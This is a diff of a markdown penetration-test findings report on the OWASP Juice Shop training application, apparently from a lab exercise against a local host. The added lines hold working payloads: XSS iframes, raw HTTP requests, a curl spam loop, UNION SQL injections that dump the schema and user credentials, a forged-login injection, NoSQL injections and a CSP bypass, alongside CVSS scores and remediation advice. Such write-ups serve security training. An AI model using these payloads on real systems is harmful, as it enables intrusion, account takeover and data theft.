@@ -59,13 +59,15 @@ arget:** Search bar (`/#/search?q=`)**
 
 ## 4. Reflected XSS
 
-**Finding ID:** JS-04** 
-****Target:** Order tracking page (`/#/track-result?id=`)** 
-**
-**Title:** Reflected Cross-Site Scripting
-**Vulnerability Type:** XSS — Reflected** 
-**
-**Brief:** A URL parameter is reflected back into the page response without encoding, allowing an attacker to craft a malicious link that executes script in the victim's browser.** ****Payload:**
+**Finding ID:** JS-04**
+****Target:** Order tracking page (`/#/track-result?id=`)**
+
+****Title:** Reflected Cross-Site Scripting
+**Vulnerability Type:** XSS — Reflected**
+
+****Brief:** A URL parameter is reflected back into the page response without encoding, allowing an attacker to craft a malicious link that executes script in the victim's browser.** **
+
+**Payload: #/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E**
 
 ```html
 <iframe src="javascript:alert(`xss`)">
@@ -163,6 +165,24 @@ Password: anything
 **
 **Payload:** Via curl/Burp to** **`POST /api/Products`:
 
+
+POST /api/Products HTTP/1.1
+Host: 192.168.20.47:29391
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Content-Length: 92
+Authorization: Bearer 
+Origin: http://192.168.20.47:29391
+Connection: keep-alive
+Referer: http://192.168.20.47:29391/
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=BK5J61ZPMOjEgVNXkvWQby03XTbiqUvHzIZFoAl4YprwL3nez29xR8moqD7a
+Priority: u=0
+
+{"name": "XSS 1", "description": "<iframe src=\"javascript:alert(`xss`)\">", "price": 47.11}
+
 ```json
 {
   "name": "XSS Test",
@@ -204,6 +224,8 @@ Password: anything
 
 **Payload:** Script or Burp Intruder sending rapid POST requests:
 
+for i in $(seq 1 10); do   curl -s -X POST http://192.168.20.47:29391/api/Feedbacks     -H "Content-Type: application/json"     -d '{"comment":"spam","rating":1,"captcha":"6","captchaId":22}'; done
+
 ```bash
 for i in $(seq 1 10); do
   curl -s -X POST http://<host>/api/Feedbacks \
@@ -226,6 +248,9 @@ done
 
 **Payload:** HTML page hosted on attacker origin: also toggle shield in the search bar, change the cookie settings to lax in about:config
 
+
+network.cookie.sameSite.laxByDefault → false** **network.cookie.sameSite.noneRequiresSecure → false
+
 ```html
 <form action="http://<juiceshop>/profile" method="POST">
   <input name="username" value="CSRFed">
@@ -239,15 +264,18 @@ done
 
 ## 13. Client-side XSS Protection Bypass
 
-**Finding ID:** JS-13** 
-****Target:** User registration — email field** 
+**Finding ID:** JS-13**
+****Target:** User registration — email field**
+
+****Title:** Persisted XSS Bypassing Client-Side Validation
+**Vulnerability Type:** XSS — Stored**
+
+****Brief:** The frontend validates the email field format, blocking XSS payloads. By intercepting the request with Burp and modifying the email field post-validation, the payload bypasses the client-side check and gets stored.**
 **
-**Title:** Persisted XSS Bypassing Client-Side Validation
-**Vulnerability Type:** XSS — Stored** 
-**
-**Brief:** The frontend validates the email field format, blocking XSS payloads. By intercepting the request with Burp and modifying the email field post-validation, the payload bypasses the client-side check and gets stored.** 
-**
-**Payload:** Intercept** **`POST /api/Users`, change email to:
+**Payload:**
+
+Intercept** **`POST /api/Users`, change email to:
+and, visit /administration
 
 ```html
 <iframe src="javascript:alert(`xss`)">
@@ -268,6 +296,23 @@ done
 **Vulnerability Type:** SQL Injection — Information Disclosure** ****Brief:** The search functionality is vulnerable to UNION-based SQL injection, allowing extraction of the entire database schema from** **`sqlite_master`.** **
 
 **Payload:**
+
+
+const token = localStorage.getItem('token');
+
+fetch('/rest/products/search?q=\')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--', {
+
+  headers: {
+
+    'Authorization': 'Bearer ' + token
+
+  }
+
+})
+
+.then(r => r.json())
+
+.then(data => console.log(data));
 
 ```sql
 ')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
@@ -318,6 +363,11 @@ done
 
 **Vulnerability Type:** XSS — CSP Bypass** 
 ****Brief:** The main application enforces CSP, but a legacy** **`/dataerasure` page lacks proper CSP headers, allowing inline script execution.** 
+
+****https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com****
+
+****in image URL in profile tab****
+
 **
 **Payload:** In the** **`?email=` parameter of** **`/dataerasure`:
 
@@ -343,6 +393,25 @@ done
 
 **Payload:** Search query:
 
+
+AS jim:
+
+POST /api/BasketItems HTTP/1.1
+Host: 192.168.20.47:29391
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Content-Length: 55
+Authorization: Bearer 
+Connection: keep-alive
+Referer: http://192.168.20.47:29391/
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=BK5J61ZPMOjEgVNXkvWQby03XTbiqUvHzIZFoAl4YprwL3nez29xR8moqD7a
+Priority: u=0
+
+{"BasketId": "2", "ProductId": 10, "quantity": 1}
+
 ```sql
 '))--
 ```
@@ -360,6 +429,10 @@ This closes the SQL query and comments out the** **`deletedAt IS NULL` filter, r
 **Title:** SQL Injection — Login as Non-Existent User** 
 ****Vulnerability Type:** SQL Injection — Authentication Bypass** 
 ****Brief:** Log in as** **`acc0unt4nt@juice-sh.op` which doesn't exist in the database, by injecting a UNION SELECT that synthesizes a fake user record on the fly.** **
+
+
+
+' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--
 
 **Payload:**
 
@@ -404,6 +477,8 @@ True-Client-IP: <iframe src="javascript:alert(`xss`)">
 
 **Payload:**
 
+rest/products/sleep(2)/reviews
+
 ```json
 { "id": "1", "$where": "sleep(2000)" }
 ```
@@ -422,6 +497,23 @@ True-Client-IP: <iframe src="javascript:alert(`xss`)">
 
 **Vulnerability Type:** NoSQL Injection** 
 ****Brief:** The review update endpoint uses unsanitized input in a MongoDB query selector, allowing an attacker to update all reviews simultaneously by injecting a wildcard condition.** **
+
+
+PATCH /rest/products/reviews HTTP/1.1
+Host: 192.168.20.47:29391
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: application/json, text/plain, */*
+Connection: keep-alive
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss;
+Authorization: Bearer 
+Content-Type: application/json
+Content-Length: 70
+
+{
+  "id": { "$ne": -1 },
+  "message": "Injected review text"
+}
+
 
 **Payload:**
 
@@ -488,6 +580,9 @@ Then request an order PDF invoice.
 
 **Payload:**
 
+
+http://192.168.20.47:29391/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20Users--
+
 ```sql
 ')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--
 ```
@@ -509,6 +604,8 @@ Then request an order PDF invoice.
 **Brief:** The order tracking endpoint passes the order ID directly into a MongoDB query. Injecting a regex wildcard returns all orders from all users.** **
 **Payload:**
 
+rest/track-order/'%20%7C%7C%20true%20%7C%7C%20'
+
 ```
 /rest/track-order/{"$regex":".*"}
 ```
@@ -521,15 +618,15 @@ Or URL encoded:** **`/rest/track-order/%7B%22%24regex%22%3A%22.*%22%7D`
 
 ## 27. Reset Bjoern's Password (Internal Account)
 
-**Finding ID:** JS-27** 
+**Finding ID:** JS-27**
 **
-**Target:** `/#/forgot-password` 
+**Target:** `/#/forgot-password`
 
 **Title:** Password Reset via OSINT — Bjoern's Internal Account
-**Vulnerability Type:** Broken Authentication / OSINT** 
-****Brief:** Bjoern's internal account security question asks for his favorite pet. Same answer as JS-10 (`Zaya`) but targeting his internal** **`@juice-sh.op` account rather than the OWASP account.** 
-**
-**Payload:** Email:** **`bjoern.kimminich@juice-sh.op` → Security answer:** **`Zaya` 
+**Vulnerability Type:** Broken Authentication / OSINT**
+****Brief:** Bjoern's internal account security question asks for his favorite pet. Same answer as JS-10 (`Zaya`) but targeting his internal** **`@juice-sh.op` account rather than the OWASP account.**
+
+****Payload:** Email:** **`bjoern@juice-sh.op` → Security answer:** **West-2082
 
 **CVSS Score:** 6.5 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N** ****Remediation:** Remove security questions entirely. Enforce MFA on all privileged accounts.** ****Rationale:** Reusing discoverable personal facts across multiple accounts compounds the exposure.** ****References:** OWASP A07:2021 – Identification and Authentication Failures; NIST SP 800-63B
 
